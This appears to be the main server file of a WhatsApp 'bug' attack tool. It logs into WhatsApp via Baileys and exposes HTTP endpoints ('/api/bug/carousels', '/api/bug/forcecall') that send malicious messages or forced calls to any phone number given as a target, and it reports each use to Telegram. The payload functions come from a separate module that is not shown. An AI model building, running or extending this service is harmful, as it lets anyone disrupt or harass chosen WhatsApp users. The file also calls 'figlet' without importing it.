console.clear();  
require('./config')
console.log('starting...');  
process.on("uncaughtException", console.error);  
  
const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap   
} = require("@whiskeysockets/baileys");  
  
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const express = require("express");
const bodyParser = require('body-parser');
const cors = require("cors");
const path = require("path");
const gradient = require('gradient-string');
const chalk = require('chalk');

const app = express();
const PORT = process.env.PORT || 5036

const { carousels2, forceCall } = require('./bugs')
const { getRequest, sendTele } = require('./telegram')
const { Boom } = require('@hapi/boom');

const usePairingCode = true;

// Fancy CLI startup banner
figlet('WA API System', (err, data) => {
  if (!err) console.log(gradient.instagram.multiline(data));
  console.log(chalk.cyan(`[🚀] Starting Express on port ${PORT}...`));
});

// Express Settings
app.enable("trust proxy");
app.set("json spaces", 2);
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));
app.use(bodyParser.raw({ limit: '50mb', type: '*/*' }));

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise((resolve) => {
        rl.question(chalk.magentaBright(text), resolve)
    });
};

async function clientstart() {
	const { useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, DisconnectReason } = require('@whiskeysockets/baileys');

	const { state, saveCreds } = await useMultiFileAuthState(`./session`);
	const { version, isLatest } = await fetchLatestBaileysVersion();

	console.log(chalk.yellow(`[📲] Baileys version: ${version.join('.')}, Latest: ${isLatest}`));

    const client = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.00"]
    });

    if (!client.authState.creds.registered) {
        const phoneNumber = await question('Please enter your WhatsApp number (start with 62):\n> ');
        const code = await client.requestPairingCode(phoneNumber, "KIUU1234");
        console.log(chalk.greenBright(`[✅] Your pairing code: ${code}`));
    }

    app.get('/api/bug/carousels', async (req, res) => {
        const { target, fjids } = req.query;
        if (!target || !fjids) return res.status(400).json({
            status: false,
            message: "parameter target dan fjids diperlukan"
        });

        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");

        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)

        try {
            await carousels2(client, cuki, fjids)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
            console.log(chalk.green(`[🎯] Carousels sent to ${cuki}`));
            const log = `\n[API HIT]

Endpoint: Carousels2
Target: ${target}
IP: ${info.ip}
Method: ${info.method}
${info.timestamp}`;
            sendTele(log)
        } catch (error) {
            console.error(chalk.redBright(`[❌] Error sending carousels:`), error.message);
            res.status(500).json({ status: false, error: error.message });
        }
    });

    app.get('/api/bug/forcecall', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({ status: false, message: "parameter target diperlukan" });

        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")

        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)

        try {
            await forceCall(client, cuki)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
            console.log(chalk.green(`[📞] Forcecall sent to ${cuki}`));
            const log = `\n[API HIT]

Endpoint: Forcecall
Target: ${target}
IP: ${info.ip}
Method: ${info.method}
${info.timestamp}`;
            sendTele(log)
        } catch (error) {
            console.error(chalk.redBright(`[❌] Error sending forcecall:`), error.message);
            res.status(500).json({ status: false, error: error.message });
        }
    });

    client.ev.on('connection.update', (update) => {
        const { konek } = require('./connect')
        konek({
            client,
            update,
            clientstart,
            DisconnectReason,
            Boom
        });
    });

    client.ev.on('creds.update', saveCreds);
    return client;
}

clientstart();

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(chalk.greenBright(`[✅] Server running at: http://localhost:${PORT}`));
}).on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(chalk.red(`[⚠️] Port ${PORT} is already in use. Trying another port...`));
    const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024);
    app.listen(newPort, () => {
      console.log(chalk.greenBright(`[✅] Server running at: http://localhost:${newPort}`));
    });
  } else {
    console.error(chalk.red(`An error occurred: ${err.message}`));
  }
});

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.blueBright(`[🌀] ${__filename} updated! Reloading...`));
  delete require.cache[file];
  require(file);
});